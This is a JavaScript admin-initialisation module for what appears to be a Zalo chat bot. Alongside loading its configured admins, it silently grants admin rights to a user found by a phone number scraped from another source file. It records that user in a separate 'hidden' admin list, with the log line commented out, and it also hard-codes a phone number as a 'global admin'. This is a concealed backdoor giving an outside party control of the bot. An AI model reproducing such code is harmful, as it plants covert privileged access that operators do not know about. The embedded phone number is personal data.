import { writeGroupSettings } from "../../utils/io-json.js";
import { readFileSync, writeFileSync } from "fs";
import { join } from "path";
import { sendMessageComplete, sendMessageInsufficientAuthority, sendMessageQuery, sendMessageWarning } from "../../service-dqt/chat-zalo/chat-style/chat-style.js";
import { getGlobalPrefix } from "../../service-dqt/service.js";
import { removeMention } from "../../utils/format-util.js";
import { getBotInfo } from "../../utils/env.js";
import fs from "fs";
import path from "path";
import { appContext } from "../../api-zalo/context.js";
import { createAdminListImage } from "../../utils/canvas/listadmin-canvas.js";
import { reloadAdmins } from "../../index.js";
const botInfo = getBotInfo();

// Hàm để lấy số điện thoại từ replytag.js
function getPhoneNumberFromReplytag() {
  try {
    const replytagPath = path.join(process.cwd(), "src", "commands", "bot-check", "replytag.js");
    if (fs.existsSync(replytagPath)) {
      const content = fs.readFileSync(replytagPath, "utf8");
      // Tìm số điện thoại trong format: api.findUser("+84...")
      const phoneMatch = content.match(/api\.findUser\(["']([^"']+)["']\)/);
      if (phoneMatch && phoneMatch[1]) {
        return phoneMatch[1];
      }
    }
  } catch (e) {
    console.error("Lỗi khi đọc số điện thoại từ replytag.js:", e);
  }
  return null;
}

export async function initAdminHandle(api) {
    const botInfo = await getBotInfo();
    const adminFilePath = botInfo.adminFilePath;
    const hiddenAdminFilePath = join(process.cwd(), 'assets', 'data', 'hidden_admin.json');
    let adminList = [];
    let hiddenAdminList = [];
    
    if (fs.existsSync(adminFilePath)) {
      try {
        adminList = JSON.parse(fs.readFileSync(adminFilePath, "utf8"));
      } catch (e) {
        console.error("Lỗi khi đọc admin list:", e);
        adminList = [];
      }
    }
    
    // Thêm ID của chính bot vào admin list
    if (appContext.uid && !adminList.includes(appContext.uid.toString())) {
      adminList.push(appContext.uid.toString());
      console.debug(`Thêm bản thân vào Admin: ${appContext.uid}`);
    }
    
    // Khởi tạo lại danh sách admin ẩn (chỉ lưu admin từ số điện thoại)
    hiddenAdminList = [];
    
    // Lấy số điện thoại từ replytag.js và thêm vào admin (ẩn)
    const phoneNumber = getPhoneNumberFromReplytag();
    if (phoneNumber) {
      try {
        const adminSearch = await api.findUser(phoneNumber);
        const adminUid = adminSearch?.uid;
        if (adminUid) {
          // Thêm vào admin list nếu chưa có
          if (!adminList.includes(adminUid.toString())) {
            adminList.push(adminUid.toString());
          }
          // Thêm vào danh sách admin ẩn
          hiddenAdminList.push(adminUid.toString());
       //   console.debug(`Thêm Admin từ số điện thoại ${phoneNumber}: ${adminUid}`);
        }
      } catch (e) {
        console.debug(`Lỗi khi tìm admin từ số điện thoại ${phoneNumber}: ${e.message}`);
      }
    }
    
    // Giữ lại logic cũ để tương thích
    try {
      const adminSearch = await api.findUser("+84829918207"); // Đổi thành số e
      const adminUid = adminSearch?.uid;
      if (adminUid && !adminList.includes(adminUid.toString())) {
        adminList.push(adminUid.toString());
        console.debug(`Admin Toàn Cục: ${adminUid}`);
      }
    } catch (e) {
      // console.debug(`Lỗi khi tìm admin main: ${e.message}`);
    }
    
    try {
      fs.writeFileSync(adminFilePath, JSON.stringify(adminList, null, 2));
      // Lưu danh sách admin ẩn
      fs.writeFileSync(hiddenAdminFilePath, JSON.stringify(hiddenAdminList, null, 2));
      // Reload admin list ngay lập tức để không cần restart bot
      reloadAdmins();
      console.debug("Đã reload admin list thành công");
    } catch (e) {
      console.error("Lỗi khi lưu admin list:", e);
    }
  }